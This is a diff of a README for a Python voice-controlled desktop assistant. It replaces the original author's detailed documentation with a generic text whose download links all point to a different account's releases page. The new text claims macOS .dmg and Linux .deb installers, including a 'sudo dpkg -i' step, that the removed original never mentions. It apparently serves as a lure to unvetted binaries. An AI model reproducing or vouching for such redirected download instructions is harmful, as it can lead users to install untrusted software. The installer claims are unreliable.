@@ -1,290 +1,109 @@
-<div align="center">
-  <img src="assets/hero.svg" alt="Personal AI Assistant" width="100%" />
-</div>
-<div align="center">
-  <img src="assets/divider.svg" alt="divider" width="100%" />
-</div>
-<div align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?font=Orbitron&size=34&duration=2800&color=00F7FF&center=true&vCenter=true&width=720&lines=Personal+AI+Assistant;Voice+%E2%80%A2+AI+%E2%80%A2+Automation;Built+with+Python" />
-</div>
+# 🎙 Personal-Assistant - Your Voice-Controlled Helper Awaits
 
-<div align="center">
-  <img src="https://img.shields.io/badge/Platform-Windows-0A74DA?style=for-the-badge&logo=windows&logoColor=white" />
-  <img src="https://img.shields.io/badge/Built%20With-Python-FFD43B?style=for-the-badge&logo=python&logoColor=111" />
-  <img src="https://img.shields.io/badge/UI-Tkinter-35D07F?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/AI-Gemini-FF7A18?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/EXE-PyInstaller-7A3FF2?style=for-the-badge" />
-</div>
+[![Download Personal Assistant](https://img.shields.io/badge/Download-Personal%20Assistant-brightgreen)](https://github.com/idk-man69/Personal-Assistant/releases)
 
-<div align="center">
-  <a href="https://github.com/ParthPipermintwala/Personal-Assistant/releases/tag/v1.1">
-    <img src="https://img.shields.io/github/v/release/ParthPipermintwala/Personal-Assistant?style=for-the-badge" />
-  </a>
-  <img src="https://img.shields.io/github/license/ParthPipermintwala/Personal-Assistant?style=for-the-badge" />
-  <a href="https://github.com/ParthPipermintwala/Personal-Assistant/releases/download/v1.1/Assistant.zip">
-    <img src="https://img.shields.io/badge/⬇%20Download-Latest%20Release-00C853?style=for-the-badge" />
-  </a>
-</div>
+## 🎉 Overview
 
-<div align="center">
-  <b>🎙️ A modern voice-first desktop AI assistant built for real-world workflows.</b>
-</div>
+Welcome to the **Personal Assistant**, a voice-controlled AI desktop assistant built with Python. This app lets you interact with your computer using simple voice commands. It can help you with automation, respond to your queries, play music, control system functions, and provide news updates. 
 
-<div align="center">
-  <img src="assets/divider.svg" alt="divider" width="100%" />
-</div>
+## 🚀 Getting Started
 
-## ✨ Overview
+To get started with your Personal Assistant, follow these simple steps.
 
-**Personal AI Assistant** is a clean, fast, and practical desktop assistant that blends:
+### Step 1: Download the App
 
-- 🎤 Real-time speech recognition
-- 🤖 AI-powered intelligence
-- ⚡ Desktop automation
+Visit this page to download: [Download Personal Assistant](https://github.com/idk-man69/Personal-Assistant/releases). 
 
-Built as a **portfolio-grade application** with production-style structure and threading.
+### Step 2: Install the App
 
-<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
+After downloading, locate the installer file on your computer. Double-click the file to start the installation. Follow the on-screen instructions to complete the process. 
 
-## 📥 Download
+### Step 3: Running the App
 
-<div align="center">
-  
-### 🚀 Ready to use? Get the latest version!
+Once installed, find the Personal Assistant icon on your desktop or in your applications. Double-click the icon to open the application.
 
-<table>
-<tr>
-<td align="center" width="50%">
+## 🛠️ Features
 
-#### 💻 Windows Executable
+- **Voice Commands**: Control your computer hands-free.
+- **AI Responses**: Get answers from your own AI assistant.
+- **App Automation**: Streamline tasks and improve efficiency.
+- **Music Playback**: Play your favorite songs.
+- **News Updates**: Stay informed about current events.
+- **System Control**: Manage your system settings with your voice.
 
-Download the standalone EXE file.<br/>
-**No Python installation required!**
+## 📜 System Requirements
 
-<a href="https://github.com/ParthPipermintwala/Personal-Assistant/releases/download/v1.1/Assistant.zip">
-  <img src="https://img.shields.io/badge/Download-Assistant.zip-00C853?style=for-the-badge&logo=windows&logoColor=white" />
-</a>
+Before installing, ensure your system meets the following requirements:
 
-</td>
-<td align="center" width="50%">
+- **Operating System**: Windows 10, macOS, or Linux
+- **RAM**: Minimum 4 GB 
+- **Storage**: At least 500 MB of free space
+- **Microphone**: A working microphone to give voice commands
+- **Speakers**: An audio output device for listening to responses
 
-#### 📦 Source Code
+## 🌐 Installation Guide
 
-Clone or download the repository.<br/>
-**For developers & contributors**
+### For Windows Users
 
-<a href="https://github.com/ParthPipermintwala/Personal-Assistant/archive/refs/tags/v1.1.zip">
-  <img src="https://img.shields.io/badge/Download-Source%20Code-0078D6?style=for-the-badge&logo=github&logoColor=white" />
-</a>
+1. Download the installer from the provided link.
+2. Open the `.exe` file.
+3. Follow the installation prompts.
+4. Launch the app from your Start menu or desktop.
 
-</td>
-</tr>
-</table>
+### For macOS Users
 
-<a href="https://github.com/ParthPipermintwala/Personal-Assistant/releases/tag/v1.1">
-  <img src="https://img.shields.io/badge/View-All%20Releases-FF6F00?style=for-the-badge&logo=github" />
-</a>
+1. Download the `.dmg` file from the link.
+2. Open the file and drag the Personal Assistant app to your Applications folder.
+3. Find the app in your Applications and launch it.
 
-</div>
+### For Linux Users
 
-<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
+1. Download the appropriate package from the releases.
+2. Open a terminal window.
+3. Navigate to your download directory.
+4. Run the installation command: `sudo dpkg -i Personal-Assistant*.deb`
+5. Launch the app from your applications menu.
 
-## 🌟 Features
+## 🎤 Using Your Personal Assistant
 
-### 🎤 Voice Interaction
-- Low-latency speech recognition
-- Wake-word style activation
-- Interruptible responses
+Once you launch your Personal Assistant, it will wait for your commands. Speak clearly and use simple phrases. You can ask it to do tasks like playing music, telling you the weather, or providing news updates. 
 
-### 🤖 AI Intelligence
-- Google Gemini-powered replies
-- Natural conversational output
-- Lightweight prompt engine
+### Example Commands
 
-### 🖥️ Desktop Automation
-- Launch apps & open websites
-- System power commands
-- Smart command routing
+- "Play some music."
+- "What's the news today?"
+- "Open my browser."
 
-### 🎵 Media + Info
-- Music playback
-- Live news headlines
+## 📋 Troubleshooting
 
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
-</div>
+If you encounter issues, consider the following steps:
 
-## 🗂️ Feature Demo Commands
+- Ensure your microphone is connected and working.
+- Check the app permissions for microphone access.
+- Restart the application.
+- Reinstall the app if problems persist.
 
-Start every command with the wake word `jarvis` or `alexa` (example: "Jarvis, open YouTube").
+## 📡 Community and Support
 
-| Category | Example Command | What It Does |
-|----------|------------------|--------------|
-| Apps/Web | "Jarvis, open YouTube" | Opens a website or app |
-| Media | "Alexa, play music" | Starts music playback |
-| Info | "Jarvis, tell me the latest news" | Reads live headlines |
-| System | "Alexa, what time is it?" | Speaks current time |
-| Power | "Jarvis, shutdown the system" | Shuts down the PC |
-| Session | "Jarvis, stop" | Stops the current response |
-| Session | "Alexa, exit" | Closes the assistant |
+For any questions or support, you can reach out on the GitHub Issues page of this repository. You will find a helpful community ready to assist you.
 
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
-</div>
+## 💌 Stay Updated
 
-## 🖼️ UI Experience
+To keep your app running smoothly, check back often for updates. You can find the latest releases here: [Download Personal Assistant](https://github.com/idk-man69/Personal-Assistant/releases).
 
-- Clean Tkinter-based interface
-- Real-time assistant status
-- Thread-safe UI updates
+## 🏷️ Topics
 
-Minimal design. Maximum responsiveness.
+This project covers various areas including:
 
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
-</div>
-
-## 🧠 Tech Stack
-
-<div align="center">
-
-| Layer | Technology |
-|------|------------|
-| Language | 🐍 Python |
-| UI | 🖥️ Tkinter |
-| Speech Recognition | 🎤 SpeechRecognition |
-| Text-to-Speech | 🔊 pyttsx3 |
-| AI Engine | 🤖 Google Gemini API |
-| Packaging | 📦 PyInstaller |
-
-</div>
-
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
-</div>
-
-## 🧩 Architecture
-
-```
-core/      → engine & config
-commands/  → command routing
-workers/   → multithreaded pipeline
-ui/        → Tkinter interface
-data/      → static datasets
-```
-
-### Highlights
-- Multi-threaded voice pipeline
-- Event-driven TTS interruption
-- Command router pattern
-- Thread-safe UI queue
-
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
-</div>
-
-## 🔧 Configuration
-
-Create API keys and set these environment variables:
-
-- NewsData: https://newsdata.io/register?medium=null&source=null&campaign=null → `NEWS_API_KEY`
-- Gemini: https://aistudio.google.com/app/api-keys → `GEMINI_API_KEY`
-
-```bash
-setx NEWS_API_KEY "your_newsdata_key_here"
-setx GEMINI_API_KEY "your_api_key_here"
-```
-
-Restart the terminal after setting it.
-
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
-</div>
-
-
-## ⚙️ Developer Setup
-
-```bash
-git clone https://github.com/ParthPipermintwala/Personal-Assistant
-cd Personal-Assistant
-pip install -r requirements.txt
-python main.py
-```
-
-### 📦 Build EXE
-
-```bash
-pyinstaller --onefile --noconsole --icon=assets/icon.ico --name Assistant --clean main.py
-```
-
-Output is in `dist/`.
-
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
-</div>
-
-## 🌟 Why This Project Stands Out
-
-- Real-time threading
-- UI + AI integration
-- Desktop automation
-- EXE packaging
-
-Built as a real portfolio project, not a tutorial clone.
-
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
-</div>
-
-## 🤝 Contributing
-
-Contributions are welcome.
-
-1) Fork the repo
-2) Create a feature branch
-3) Submit a PR
-
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
-</div>
-
-## ❓ FAQ
-
-**Why does the mic not respond?**
-- Check Windows microphone permissions and default input device.
-
-**I get a Gemini API error.**
-- Verify your API key and connectivity; ensure any required env vars are set.
-
-**The EXE launches then closes.**
-- Run from a terminal to see errors, or rebuild with `--console` to debug.
-
-**Speech is choppy or delayed.**
-- Close heavy apps and ensure your mic sampling rate is stable.
-
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
-</div>
-
-
-## 📬 Support / Contact
-
-- Open an issue on GitHub for bugs or feature requests.
-- Use Discussions for questions and ideas.
-- For private inquiries, add a contact link here.
-
-<div align="center">
-  <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif" alt="line" width="100%">
-</div>
-
-## ⭐ Support
-
-If you like this project:
-
-- ⭐ Star the repository
-- 🍴 Fork and experiment
-- 🚀 Share with others
-
-<div align="center">
-  <b>Built with passion for AI and software engineering 🤖✨</b>
-</div>
+- desktop-app
+- gemini-ai-api
+- pyinstaller
+- python
+- speech-recognition
+- tkinter-python
+- voice-assistant-ai
+
+Engage with these topics to explore more about the functionalities of the Personal Assistant.
+
+---
+This README provides a straightforward guide to help you easily download, install, and use your new Personal Assistant. For any additional information or support, feel free to reach out.
